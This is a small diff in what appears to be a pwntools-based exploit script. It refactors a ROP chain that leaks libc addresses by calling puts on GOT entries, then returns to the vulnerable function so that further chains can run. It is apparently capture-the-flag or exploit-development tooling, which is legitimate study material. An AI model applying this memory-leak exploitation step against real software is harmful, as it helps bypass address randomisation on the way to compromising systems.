@@ -11,8 +11,7 @@ def puts(state: PwnState) -> PwnState:
     LEAK_FUNCS = ["__libc_start_main", "puts"]
     rop = ROP(state.elf)
     for func in LEAK_FUNCS:
-        rop.puts(state.elf.got["__libc_start_main"])
-        rop.puts(state.elf.got["puts"])
+        rop.puts(state.elf.got[func])
     rop.call(state.vuln_function)  # return back so we can execute more chains later
     log.info(rop.dump())
 
